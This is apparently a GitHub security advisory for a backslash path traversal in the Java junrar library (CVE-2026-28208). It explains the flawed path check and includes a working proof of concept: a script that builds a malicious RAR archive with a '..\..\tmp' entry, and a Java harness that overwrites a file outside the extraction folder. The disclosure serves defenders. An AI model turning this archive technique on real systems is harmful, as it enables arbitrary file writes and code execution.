# [M] Junrar has an arbitrary file write due to backslash Path Traversal bypass in LocalFolderExtractor on Linux/Unix

## Summary
Severity: Medium
Advisory: GHSA-j273-m5qq-6825
CVE: CVE-2026-28208
CWE: CWE-22
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-02-27
Source: https://github.com/advisories/GHSA-j273-m5qq-6825
Type: github-advisory

## Affected
- Maven: `com.github.junrar:junrar` — affected >=0 <7.5.8

## Details
### Summary

A backslash path traversal vulnerability in `LocalFolderExtractor` allows an attacker to write arbitrary files with attacker-controlled content anywhere on the filesystem when a crafted RAR archive is extracted on Linux/Unix. This can often lead to remote code execution (e.g., overwriting shell profiles, source code, cron jobs, etc).

### Details

The `createFile()` method in [`LocalFolderExtractor.java`](https://github.com/junrar/junrar/blob/master/src/main/java/com/github/junrar/LocalFolderExtractor.java) validates extraction paths using `getCanonicalPath().startsWith()` to ensure files stay within the destination directory:

```java
File f = new File(destination, name);
String dirCanonPath = f.getCanonicalPath();
if (!dirCanonPath.startsWith(destination.getCanonicalPath())) {
    throw new IllegalStateException("Rar contains file with invalid path: '" + dirCanonPath + "'");
}
```

On Linux/Unix, backslashes are literal filename characters, not path separators. A RAR entry named `..\..\tmp\evil.txt` is treated by `getCanonicalPath()` as a single literal filename containing backslash characters — no `..` resolution occurs, and the `startsWith` check passes.

However, `makeFile()` then splits the filename on backslashes and reconstructs the path using the platform's file separator:

```java
final String[] dirs = name.split("\\\\");
// dirs = ["..", "..", "tmp", "evil.txt"]
// ...
path = path + File.separator + dirs[i];  // File.separator is "/" on Linux
```

This converts the literal backslashes into real directory traversal: `../../tmp/evil.txt`. The `extract()` method then opens a `FileOutputStream` on this path and writes the RAR entry's content to it, achieving arbitrary file write outside the extraction directory.

On Windows this is not exploitable because backslashes are path separators, so `getCanonicalPath()` correctly resolves the `..` components and the `startsWith` check blocks the traversal.

**Affected versions:** Tested on 7.5.7 (latest). Likely affects all versions that include the `makeFile()` backslash-splitting logic in `LocalFolderExtractor`.

### PoC (Files Below)

**Prerequisites:** Linux/Unix system with Java 17+ and Maven installed.

1. Run `bash poc_setup.sh` which installs junrar 7.5.7 via Maven, creates a malicious RAR archive containing an entry with a backslash-traversal filename (`..\..\tmp\existing-file`), and creates `/tmp/existing-file` with the content "Existing File" to simulate a pre-existing file.
2. Run `mvn exec:java -Dexec.mainClass='com.test.BackslashTraversalPoC' -q`
3. Observe the output shows `/tmp/existing-file` was overwritten from "Existing File" to "Overwritten", confirming the file outside the extraction directory was written with attacker-controlled content.

The PoC uses `Junrar.extract()` — the standard public API for extracting RAR archives.

### Impact

Any application that extracts user-supplied RAR archives using junrar on Linux/Unix is vulnerable to arbitrary file write/overwrite with attacker-controlled content. This can often lead to RCE.

This affects all Linux/Unix deployments. Windows is not affected.

## POC Files

**poc_setup.sh**
```
#!/bin/bash
# Setup script for junrar backslash path traversal PoC
# Vulnerability: CWE-22/CWE-29 - Backslash path traversal bypass in LocalFolderExtractor
# Package: com.github.junrar:junrar 7.5.7 (Java)

set -e

# Use the directory where this script lives as the working directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo "=== Setting up junrar backslash path traversal PoC ==="
echo "Working directory: $SCRIPT_DIR"

# Clean up artifacts from previous runs
rm -f malicious.rar
rm -rf target extraction-output

# Verify Java and Maven are available
java -version 2>&1 | head -1 || { echo "ERROR: Java not found"; exit 1; }
mvn -version 2>&1 | head -1 || { echo "ERROR: Maven not found"; exit 1; }

# Create Maven project
cat > pom.xml << 'POMEOF'
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.test</groupId>
    <artifactId>junrar-poc</artifactId>
    <version>1.0</version>
    <packaging>jar</packaging>
    <properties>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <dependency>
            <groupId>com.github.junrar</groupId>
            <artifactId>junrar</artifactId>
            <version>7.5.7</version>
        </dependency>
    </dependencies>
</project>
POMEOF

# Install dependencies
echo "Installing junrar 7.5.7..."
mvn dependency:resolve -q

# Copy and compile PoC
mkdir -p src/main/java/com/test
cp poc.java src/main/java/com/test/BackslashTraversalPoC.java
echo "Compiling PoC..."
mvn compile -q

# Verify junrar version
echo "Installed: junrar 7.5.7"

# Create the malicious RAR3 archive:
#   Entry 1: file with name "..\..\tmp\existing-file" containing "Overwritten"
#
# On Linux, createFile() validates the path using getCanonicalPath().startsWith().
# Since backslashes are literal characters on Linux, getCanonicalPath() does NOT
# resolve the ".." components, so the check passes. makeFile() then splits on
# backslashes and joins with File.separator (/), converting the literal backslashes
# into real directory traversal: ../../tmp/existing-file
python3 << 'PYEOF'
import struct, zlib

RAR3_MAGIC = b'Rar!\x1a\x07\x00'
RAR_BLOCK_MAIN = 0x73
RAR_BLOCK_FILE = 0x74
RAR_BLOCK_ENDARC = 0x7b
RAR_LONG_BLOCK = 0x8000
RAR_OS_UNIX = 3
RAR_M0 = 0x30      # Store (no compression)
S_IFREG = 0o100000

def crc16(data):
    return zlib.crc32(data) & 0xFFFF

def main_header():
    # Standard RAR3 main archive header (non-encrypted)
    # After the 7-byte base block: HighPosAv (2 bytes) + PosAv (4 bytes)
    # junrar always reads exactly 6 bytes here (MainHeader.mainHeaderSize = 6)
    extra = struct.pack('<HI', 0, 0)  # HighPosAv=0, PosAv=0
    header_data = struct.pack('<BHH', RAR_BLOCK_MAIN, 0, 7 + len(extra)) + extra
    return struct.pack('<H', crc16(header_data)) + header_data

def file_block(filename, file_data):
    fname = filename.encode('utf-8')
    data = file_data.encode('utf-8')
    mode = S_IFREG | 0o644
    # UNP_VER=0: junrar's doUnpack() calls unstoreFile() when method==0x30,
    # then falls through to a switch on UNP_VER. Using 0 avoids matching any
    # decompression case (15/20/26/29/36), so only unstoreFile() runs.
    file_hdr = struct.pack('<LLBLLBBHL',
        len(data), len(data), RAR_OS_UNIX,
        zlib.crc32(data) & 0xFFFFFFFF, 0x5A210000,
        0, RAR_M0, len(fname), mode)
    header_body = struct.pack('<BHH', RAR_BLOCK_FILE, RAR_LONG_BLOCK,
        7 + len(file_hdr) + len(fname)) + file_hdr + fname
    return struct.pack('<H', crc16(header_body)) + header_body + data

def endarc():
    # junrar's EndArcHeader.isValid() requires flags=0x4000 and CRC=0x3DC4
    header_data = struct.pack('<BHH', RAR_BLOCK_ENDARC, 0x4000, 7)
    crc = crc16(header_data)
    return struct.pack('<H', crc) + header_data

archive = bytearray()
archive += RAR3_MAGIC
archive += main_header()
# Backslash-separated path: on Linux, createFile() sees literal backslashes,
# but makeFile() splits on them and joins with /
archive += file_block('..\\..\\tmp\\existing-file', 'Overwritten\n')
archive += endarc()

with open('malicious.rar', 'wb') as f:
    f.write(archive)
PYEOF
echo "Created malicious.rar"

# Create the target file so it can be validated before running the payload
printf "Existing File\n" > /tmp/existing-file

echo ""
echo "=== Setup complete ==="
echo "Validate: cat /tmp/existing-file  (should show 'Existing File')"
echo "Run PoC: mvn exec:java -Dexec.mainClass='com.test.BackslashTraversalPoC' -q"
```

**poc.java**
```
package com.test;

import com.github.junrar.Junrar;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * PoC: Backslash path traversal bypass in junrar 7.5.7
 *
 * A RAR archive containing an entry with backslash-separated ".." components
 * bypasses the createFile() canonical path validation on Linux and writes
 * files outside the extraction directory via makeFile()'s path reconstruction.
 */
public class BackslashTraversalPoC {

    static final String TARGET = "/tmp/existing-file";
    static final String ARCHIVE = "malicious.rar";

    public static void main(String[] args) throws Exception {
        File archive = new File(ARCHIVE);
        if (!archive.exists()) {
            archive = new File(new File(System.getProperty("user.dir")).getParent(), ARCHIVE);
        }

        // Step 1: Verify the pre-existing file (created by poc_setup.sh)
        File target = new File(TARGET);
        if (!target.exists()) {
            System.out.println("ERROR: " + TARGET + " not found. Run poc_setup.sh first.");
            System.exit(1);
        }

        System.out.println("Before extraction:");
        System.out.println("  " + TARGET + " => " + Files.readString(Path.of(TARGET)).trim());
        System.out.println();

        // Step 2: Extract the malicious archive
        Path extractDir = Files.createTempDirectory("junrar-poc-");
        System.out.println("Extracting " + archive.getAbsolutePath() + " into " + extractDir + " ...");
        try {
            Junrar.extract(archive, extractDir.toFile());
        } catch (Exception e) {
            System.out.println("Extraction error (may be expected): " + e.getMessage());
        }
        System.out.println();

        // Step 3: Show the result
        System.out.println("After extraction:");
        String content = Files.readString(Path.of(TARGET)).trim();
        System.out.println("  " + TARGET + " => " + content);
        System.out.println();

        if (content.equals("Overwritten")) {
            System.out.println("VULNERABLE: junrar 7.5.7 backslash traversal overwrote " + TARGET);
        } else {
            System.out.println("NOT VULNERABLE: file contents unchanged");
        }
    }
}
```

## References
- https://github.com/junrar/junrar/security/advisories/GHSA-j273-m5qq-6825
- https://nvd.nist.gov/vuln/detail/CVE-2026-28208
- https://github.com/junrar/junrar/commit/947ff1d33f00f940aa68ae2593500291d799d954
- https://github.com/junrar/junrar
- https://github.com/junrar/junrar/releases/tag/v7.5.8
